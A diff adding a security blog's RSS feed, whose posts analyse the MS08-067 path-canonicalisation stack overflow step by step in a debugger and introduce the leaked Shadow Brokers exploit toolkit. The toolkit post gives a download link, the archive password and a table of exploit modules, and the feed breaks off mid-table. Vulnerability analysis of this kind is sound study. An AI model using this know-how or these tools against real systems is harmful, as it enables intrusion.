@@ -1,0 +1,547 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>CVE | HumblePoster</title>
+    <link>https://p0st3r.github.io/tags/cve/</link>
+      <atom:link href="https://p0st3r.github.io/tags/cve/index.xml" rel="self" type="application/rss+xml" />
+    <description>CVE</description>
+    <generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator><language>en-us</language><copyright>2016</copyright><lastBuildDate>Tue, 12 Sep 2017 00:00:00 +0000</lastBuildDate>
+    <image>
+      <url>https://p0st3r.github.io/images/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_512x512_fill_lanczos_center_2.png</url>
+      <title>CVE</title>
+      <link>https://p0st3r.github.io/tags/cve/</link>
+    </image>
+    
+    <item>
+      <title>MS08-067漏洞原理及复现分析</title>
+      <link>https://p0st3r.github.io/publication/ms-08-067-analyise/</link>
+      <pubDate>Tue, 12 Sep 2017 00:00:00 +0000</pubDate>
+      <guid>https://p0st3r.github.io/publication/ms-08-067-analyise/</guid>
+      <description>&lt;h2 id=&#34;445端口&#34;&gt;445端口&lt;/h2&gt;
+&lt;p&gt;首先介绍一下这个引发了诸多特大漏洞的445端口。&lt;/p&gt;
+&lt;p&gt;TCP 445端口主要运行两种服务：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;SMB 网络服务&lt;/li&gt;
+&lt;li&gt;MSRPC 网络服务&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;**SMB（Server Message Block，服务器消息块）**首先提供了 Windows 网络中最常用的远程文件与打印机共享网络服务，其次，SMB的命名管道是 MSRPC 协议认证和调用本地服务的承载传输层。&lt;/p&gt;
+&lt;p&gt;SMB 作为应用层协议，其直接运行在TCP 445端口上，也可通过调用 NBT 的 TCP 139端口来接收数据。&lt;/p&gt;
+&lt;p&gt;**MSRPC（Microsoft Remote Procedure Call，微软远程过程调用）**是对 DCE/RPC 在 Windows 系统下的重新改进和实现，用以支持Windows系统中的应用程序能够无缝地通过网络调用远程主机上服务进程中的过程。&lt;/p&gt;
+&lt;p&gt;DCE/RPC 独立运行于网络传输层协议上，采用的网络传输层协议包括：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;ncacn_ip_tcp =&amp;gt; TCP 139&lt;/li&gt;
+&lt;li&gt;ncadg_ip_udp =&amp;gt; UDP 135&lt;/li&gt;
+&lt;li&gt;ncacn_np =&amp;gt; TCP 139、445&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;其中，主要使用的是 ncacn_np（SMB命名管道传输协议），也就是利用 SMB 命名管道机制作为 RPC 的承载传输协议（MSRPC over SMB）。&lt;/p&gt;
+&lt;p&gt;只有少数如MS09-050是直接针对SMB服务的，而MSRPC作为调用大量本地服务进程的网络接口，常常被利用 MSRPC over SMB 为通道如MS08-067来攻击本地服务中存在的安全漏洞。&lt;/p&gt;
+&lt;h1 id=&#34;0x01-ms08-067漏洞原理&#34;&gt;0x01 MS08-067漏洞原理&lt;/h1&gt;
+&lt;p&gt;MS08-067漏洞是通过 MSRPC over SMB 通道调用 Server 服务程序中的 NetPathCanonicalize 函数时触发的，而 NetPathCanonicalize 函数在远程访问其他主机时，会调用 NetpwPathCanonicalize 函数，对远程访问的路径进行规范化，而在 NetpwPathCanonicalize 函数中存在的逻辑错误，造成栈缓冲区可被溢出，而获得远程代码执行（Remote Code Execution）。&lt;/p&gt;
+&lt;p&gt;所谓路径规范化，就是将路径字符串中的【/】转换为【\】，同时去除相对路径【.\】和【..\】。如：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;**/*/./**   =&amp;gt;  **\*\**
+**\*\..\**  =&amp;gt;  **\**
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在路径规范化的操作中，服务程序对路径字符串的地址空间检查存在逻辑漏洞。攻击者通过精心设计输入路径，可以在函数去除【..\】字符串时，把路径字符串中内容复制到路径串之前的地址空间中（低地址），达到覆盖函数返回地址，执行任意代码的目的。&lt;/p&gt;
+&lt;h2 id=&#34;路径处理流程&#34;&gt;路径处理流程&lt;/h2&gt;
+&lt;p&gt;NetpwPathCanonicalize 函数并没有直接进行输入路径和规范化，而是继续调用了下级函数CanonicalizePathName 来进行路径整理，将待整理的路径字符串进行规范化，然后再&lt;strong&gt;保存到预先分配的输出路径缓冲区buffer中&lt;/strong&gt;。&lt;/p&gt;
+&lt;p&gt;路径处理流程：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;检查待整理路径的第一个字符&lt;/li&gt;
+&lt;li&gt;调用msvcrt.dll模块的wcslen函数计算路径长度&lt;/li&gt;
+&lt;li&gt;调用msvcrt.dll模块的wcscat函数把待整理路径全部复制到新申请的内存中&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;\4. 调用wcscpy函数，去掉待整理路径中第一个表示父目录的相对路径复制到strTemp，如：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;\******\..\..\***   =&amp;gt;  \..\***
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;5.循环调用wcscpy，直到路径整理完毕&lt;/p&gt;
+&lt;p&gt;在这里我们知道了，在规范化复制时要寻找表示父目录的【..\】字符串及其前面的一个【\】字符串，将这一段去掉并将新路径复制。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;v2-a227e632597e472caec3c37457455d8a_hd.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;如图，第一次检查时去掉了第一个相对路径并复制到缓冲区&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;但是，当【..\】字符串在路径字符串的最前面时，那么其前面的一个【\】就在缓冲区外面了，就是在这里产生了向前（低地址）的溢出。&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;v2-9709d2768dff1383b5a1dbb6567016a1_hd.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;缓冲区溢出&#34;&gt;缓冲区溢出&lt;/h2&gt;
+&lt;p&gt;需要明确的是，微软对路径规范化时的字符串复制可能出现的缓冲区溢出做了初步的防御。&lt;/p&gt;
+&lt;p&gt;在每次向缓冲区中复制字符串时，无论是用 wcsccpy 还是 wcscat，在复制前总要比较源字符串的长度，保证长度小于某个值（207），否则不会继续复制，这一策略确保缓冲区不会向高地址溢出，即当前函数返回时不会发生问题。&lt;/p&gt;
+&lt;p&gt;**但是注意，**在规范化表示路径，寻找父目录的【..\】字符串前面的【\】字符时，程序做了判断和边界检查：如果当前比较字符的地址与源字符串地址相同，就表明整个字符串已经查找完毕，程序就会停止查找。&lt;/p&gt;
+&lt;p&gt;然而它唯独漏了一种情况，就是当父目录相对路径【..\】字符串在源字符串的开头时，在开始查找时比较的字符串(【\】到【..\】)位于缓冲区之外，这导致了复制的字符串向低地址的溢出，造成函数wcscpy的返回地址被覆盖。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;v2-f51502175256d3571f471872250a7d2a_hd.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;0x02-漏洞还原分析&#34;&gt;0x02 漏洞还原分析&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;实验环境&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;靶机 Windows2003 SP0 EN&lt;/li&gt;
+&lt;li&gt;漏洞组件 netapi32.dll&lt;/li&gt;
+&lt;li&gt;工具 IDA Pro、OllyDbg&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;选择 Windows XP SP3 EN 系统主机作为分析环境，定位到包含该安全漏洞的系统模块netapi32.dll（路径C:\Windows\system32）和调用漏洞服务 Server 的进程 svchost.exe，目标进程命令行为&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;C:\Windows\System32\svchost.exe-k netsvcs
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;用 IDA pro 打开 netapi32.dll，找到漏洞所在的 NetpwPathCanonicalize 函（每次运行堆栈中的地址会不同，但各函数的地址一样），如图在书中提到&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;查看该函数流程图，可以看到，此函数并没有直接进行输入路径的规范化， 而是继续调用了下级函数 CanonicalizePathName&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;然而在实际操作中并没有发现 CanonicalizePathName 这个函数，并且多种资料表明应当是调用 CanonPathName 函数进行规范化。&lt;/p&gt;
+&lt;p&gt;IDA分析 NetpwPathCanonicalize 函数代码（F5 + 整理 + 主要代码）：&lt;/p&gt;
+&lt;p&gt;该函数声明如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;DWORD NetpwPathCanonicalize(
+    LPWSTR PathName, &lt;span style=&#34;color:#75715e&#34;&gt;//需要标准化的路径
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    LPWSTR Outbuf, &lt;span style=&#34;color:#75715e&#34;&gt;//存储标准化后的路径的Buffer
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    DWORD OutbufLen, &lt;span style=&#34;color:#75715e&#34;&gt;//Buffer长度
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    LPWSTR Prefix, &lt;span style=&#34;color:#75715e&#34;&gt;//可选参数，当PathName是相对路径时有用
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    LPDWORD PathType, &lt;span style=&#34;color:#75715e&#34;&gt;//存储路径类型
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    DWORD Flags &lt;span style=&#34;color:#75715e&#34;&gt;// 保留，为0
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt; )
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;动态调试&#34;&gt;动态调试&lt;/h2&gt;
+&lt;p&gt;通过wmic查看命令行参数为svchost.exe -k netsvcs的进程pid&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;v2-1288255ae58fb85ca4ac480f2c53a1e0_hd.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;打开OllyDbg，点击file-&amp;gt;attach，附着到svchost.exe进程上&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;1557342950869.png&#34; alt=&#34;1557342950869&#34;&gt;&lt;/p&gt;
+&lt;p&gt;View-&amp;gt;Executable modules双击netapi32，在cpu指令窗口右键选Search for查找exec(label) in current module，找到函数NetpwPathCanonicalize，地址为71C44A3E，在此处设下断点。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;1557343007573.png&#34; alt=&#34;1557343007573&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;追踪漏洞触发过程&#34;&gt;追踪漏洞触发过程&lt;/h2&gt;
+&lt;p&gt;回到CPU指令窗口运行程序，然后攻击机Metasploit加载ms08_067_netapi模块并exploit&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;1557343016344.png&#34; alt=&#34;1557343016344&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;netpwpathcanonicalize中断&#34;&gt;NetpwPathCanonicalize中断&lt;/h3&gt;
+&lt;p&gt;分析环境中的svchost程序会中断在 NetpwPathCanonicalize 函数的入口地址处。该函数的传入参数如下所示：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;1557343159242.png&#34; alt=&#34;1557343159242&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;esp    		[esp]		* 注释 *
+00ECF924	02248D34	;指向待整理路径
+00ECF928	022321D8	;指向输出路径buffer
+00ECF92C	000003F1	;输出buffer的长度
+00ECF930	02248FB0	;指向prefix，值为 \x5C\x00 ，即unicode ‘\’
+00ECF934	02248FB4	;指向路径类型，值为 0x1001
+00ECF938	00000000	;WORD Flags保留，值为0
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;canonicalizepathname中断&#34;&gt;CanonicalizePathName中断&lt;/h3&gt;
+&lt;p&gt;结合IDA pro对 NetpwPathCanonicalize 的流程分析，在 地址处将调用下一级函数 CanonPathName，在此地址设下断点。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;1557343329568.png&#34; alt=&#34;1557343329568&#34;&gt;&lt;/p&gt;
+&lt;p&gt;运行到此断点，然后跟踪函数 CanonPathName，传入参数如下所示：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;00F0F8FC	00157570	;指向prefix，值为\x5C\00，即Unicode&amp;#34;\&amp;#34;
+00F0F900	001572F4	;指向待整理路径
+00F0F904	02132E80	;指向输出路径的buffer
+00F0F908	000003F9	;输出buffer的长度
+00F0F90C	00000000	;WORD Flag保留字，值为0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;从上两个函数的参数传递可以看出，函数 CanonPathName 进行路径整理，然后再保存到预先分配的输出路径缓冲区buffer中。&lt;/p&gt;
+&lt;h3 id=&#34;待整理路径结构&#34;&gt;待整理路径结构&lt;/h3&gt;
+&lt;p&gt;在OD中查看待整理路径的结构，路径是Unicode字符串，以【\x5C\x00】(Unicode字符“\”)开始，【\x00\x00】结束，中间包含一些随机的大小写字母，较长一段不可显示的字符是经过编码的Shellcode，其中最关键的是两个连在一起的父目录相对路径【....\】。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;1557343359609.png&#34; alt=&#34;1557343359609&#34;&gt;&lt;/p&gt;
+&lt;p&gt;整个待整理路径形如：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;\******\..\..\***
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;整理路径前的预操作&#34;&gt;整理路径前的预操作&lt;/h3&gt;
+&lt;p&gt;在待整理路径所在内存地址000C0F50处4字节上设内存访问断点&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;1557343390836.png&#34; alt=&#34;1557343390836&#34;&gt;&lt;/p&gt;
+&lt;p&gt;按F9运行，会中断3次，前两次分别是检查待整理路径的第一个字符和调用wcslen函数，第三次是在调用wcscat函数。分析第三次传入栈中两个参数&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;1557343410176.png&#34; alt=&#34;1557343410176&#34;&gt;&lt;/p&gt;
+&lt;p&gt;第一个是strDestination，指向一段以【\x5c\x00】开头的内存空间；第二个是strSource，指向上述待整理路径前两字节【\x5c\x00】后的内容。&lt;/p&gt;
+&lt;p&gt;程序把待整理路径全部复制到strDestination，即0x001572F6处。在此4字节设断点，类型选择&amp;quot;Hardware, on access&amp;quot;DWord。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;1557343435014.png&#34; alt=&#34;1557343435014&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;复制路径到缓冲区&#34;&gt;复制路径到缓冲区&lt;/h3&gt;
+&lt;p&gt;F9继续运行，第4次中断在0x77BD4010 ，内存里显示这里将src的前两个字符复制到了dest的【\x5C\x00】后面，这是由于这两个字节设了断点的原因。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;1557343573648.png&#34; alt=&#34;1557343573648&#34;&gt;&lt;/p&gt;
+&lt;p&gt;第5次中断在0x71C44B1C，位于wcscat函数内，内存显示已将src复制到dest，如图:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;1557343589111.png&#34; alt=&#34;1557343589111&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;1557343606903.png&#34; alt=&#34;1557343606903&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;第一次路径规范化&#34;&gt;第一次路径规范化&lt;/h3&gt;
+&lt;p&gt;按F9运行，中断多次后停在内存0x77bd4d36处，通过栈可知此处属于wcscpy函数。此处调用该函数进行第一次路径规范化。如图&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;1557343631915.png&#34; alt=&#34;1557343631915&#34;&gt;&lt;/p&gt;
+&lt;p&gt;当前参数src值为0x00EC6E0，指向【..***】;参数 strDestination 值为0x00ECF4DC，指向temp中的第一个字符【\】。 显然，这次路径规范化即把待整理路径中第一个字符【\】和第一个【..\】相对路径之间的内容抛弃。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;1557343644183.png&#34; alt=&#34;1557343644183&#34;&gt;&lt;/p&gt;
+&lt;p&gt;而此时wcscpy源地址src在edx寄存器中，指向【..***】；目的地址dest在ecx寄存器中，指向待整理路径第一个字符【\】，如图&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;1557343668919.png&#34; alt=&#34;1557343668919&#34;&gt;&lt;/p&gt;
+&lt;p&gt;所以，这次字符串复制操作就是去掉第一个表示父目录的相对路径，即待整理路径temp中的第一个【\】和第一个【..\】之间的内容成为无用路径被抛弃。操作完成后，temp中的路径字符形如【..***】。&lt;/p&gt;
+&lt;p&gt;第一次规范化后，待整理路径形如&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;\..\***
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;由于还有【..\】，还需要进行一次规范化，而这第二次规范化正是玄机所在。&lt;/p&gt;
+&lt;h3 id=&#34;第二次路径规范化&#34;&gt;第二次路径规范化&lt;/h3&gt;
+&lt;p&gt;由于每次路径规范化都会调用wcscpy函数，接下来删除0x00ECF4DC的硬件断点，直接在wcscpy函数的入口地址0x77BD4D28处下断点。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;1557343841212.png&#34; alt=&#34;1557343841212&#34;&gt;&lt;/p&gt;
+&lt;p&gt;F9运行后中断在wcscpy函数入口0x77BD4D28处，调用wcscpy函数传入的参数&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;1557343857034.png&#34; alt=&#34;1557343857034&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;esp			[esp]		* 注释 *
+00ECF4AC	00ECF494	目的地址，指向的内存区域值为\x5c\x00，即【\】
+00ECF4B0	00ECF4E2	源地址，指向第二个相对路径【\..\】的最后一个斜杠
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;正常情况下，这次规范化处理会和第一次执行同样的操作，去除第二个相对路径【..\】，从而完成第二次的路径规范化。但这里出现了一个意外的情况，temp的首地址是0x00ECF4DC，而此次字符串复制操作的目的地址dest却在0x00ECF494，在temp之前，如图&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;1557343903100.png&#34; alt=&#34;1557343903100&#34;&gt;&lt;/p&gt;
+&lt;p&gt;同时注意到，栈指针ESP值为0x00ECF4A8，该地址指向wcscpy函数的返回地址0x71C52FD4。ESP到复制目的dest地址0x00ECF494只有0x14字节，于是，函数wcscpy如果继续执行，将用源字符串src覆盖wcscpy函数的返回地址。&lt;/p&gt;
+&lt;p&gt;执行到retn命令，可以看到返回地址变成了0x0100129E，，该地址的指令为：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;00100129E		FFD6		call esi
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;执行 call esi（ES=0x00F0F4DE）指令，正好将EIP指向复制尽量的字符串中构造好的第8字节空指令，接着是【\xeb\x62】（jmp 0x62），此jmp指令跳过中间的随机字符串，指向经过编码的Shellcode，如图&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;1557343946968.png&#34; alt=&#34;1557343946968&#34;&gt;&lt;/p&gt;
+&lt;p&gt;所以这里是由于内存0x00F0F494处的一个【\】(0x5C)，使得出现在处理父母了相对路径【..\】时往前溢出了待处理路径，从而将字符串覆盖到函数wcscpy返回地址的位置，跳转到shellcode造成远程代码执行。&lt;/p&gt;
+&lt;p&gt;正如前面所提到的，当【..\】在源字符串开头的时候，在开始查找时，比较的字符位于缓冲区之外导致了向前的溢出。&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>NSA方程式工具利用与分析</title>
+      <link>https://p0st3r.github.io/post/nsa-tools/</link>
+      <pubDate>Fri, 28 Apr 2017 00:00:00 +0000</pubDate>
+      <guid>https://p0st3r.github.io/post/nsa-tools/</guid>
+      <description>&lt;h1 id=&#34;shadowbroker&#34;&gt;Shadowbroker&lt;/h1&gt;
+&lt;p&gt;下载地址&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://yadi.sk/d/NJqzpqo_3GxZA4&#34;&gt;https://yadi.sk/d/NJqzpqo_3GxZA4&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;解压密码&lt;/strong&gt;：Reeeeeeeeeeeeeee&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;github下载地址&lt;/strong&gt;：
+&lt;a href=&#34;http://link.zhihu.com/?target=https%3A//github.com/misterch0c/shadowbroker&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/misterch0c/shadowbroker&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;释放的工具总共包含三个文件夹，&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Swift：包含了NSA对SWIFT银行系统发动攻击的相关证据，其中有EastNets的一些PPT文档、相关的证据、一些登录凭证和内部架构，EastNets是中东最大的SWIFT服务机构之一。&lt;/li&gt;
+&lt;li&gt;OddJob：包含一个基于Windows的植入软件，并包括所指定的配置文件和payload。适用于Windows Server 2003 Enterprise（甚至Windows XP Professional）&lt;/li&gt;
+&lt;li&gt;Windows：包含对Windows操作系统的许多黑客工具，但主要针对的是较旧版本的Windows（Windows XP中）和Server 2003。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;主要工具&#34;&gt;主要工具&lt;/h1&gt;
+&lt;h2 id=&#34;fuzzbunch一款类似metasploit的exploit框架&#34;&gt;FUZZBUNCH：一款类似Metasploit的Exploit框架&lt;/h2&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th align=&#34;center&#34;&gt;模块&lt;/th&gt;
+&lt;th align=&#34;center&#34;&gt;漏洞&lt;/th&gt;
+&lt;th align=&#34;center&#34;&gt;影响系统&lt;/th&gt;
+&lt;th align=&#34;center&#34;&gt;默认端口&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;Easypi&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;IBM Lotus Notes漏洞&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;Windows NT, 2000 ,XP, 2003&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;3264&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;Easybee&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;MDaemon WorldClient电子邮件服务器漏洞&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;WorldClient 9.5, 9.6, 10.0, 10.1&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;/&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;Eternalblue&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;SMBv2漏洞(MS17-010)&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;Windows XP(32),Windows Server 2008 R2(32/64),Windows 7(32/64)&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;139/445&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;Doublepulsar&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;SMB和NBT漏洞&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;Windows XP(32), Vista, 7, Windows Server 2003, 2008, 2008 R2&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;139/445&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;Eternalromance&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;SMBv1漏洞(MS17-010)和 NBT漏洞&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;Windows XP, Vista, 7, Windows Server 2003, 2008, 2008 R2&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;139/445&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;Eternalchampion&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;SMB和NBT漏洞&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;Windows XP, Vista, 7, Windows Server 2003, 2008, 2008 R2, 2012, Windows 8 SP0&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;139/445&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;Eternalsynergy&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;SMB和NBT漏洞&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;Windows 8, Windows Server 2012&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;139/445&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;Explodingcan&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;IIS6.0远程利用漏洞&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;Windows Server 2003&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;80&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;Emphasismine&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;IMAP漏洞&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;IBM Lotus Domino 6.5.4, 6.5.5, 7.0, 8.0, 8.5&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;143&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;Ewokfrenzy&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;IMAP漏洞&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;IBM Lotus Domino 6.5.4, 7.0.2&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;143&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;Englishmansdentist&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;SMTP漏洞&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;/&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;25&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;Erraticgopher&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;RPC漏洞&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;Windows XP SP3, Windows 2003&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;445&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;Eskimoroll&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;kerberos漏洞&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;Windows 2000, 2003, 2003 R2, 2008, 2008 R2&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;88&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;Eclipsedwing&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;MS08-067漏洞&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;Windows 2000, XP, 2003&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;139/445&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;Educatedscholar&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;MS09-050漏洞&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;Windows vista, 2008&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;445&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;Emeraldthread&lt;/td&gt;
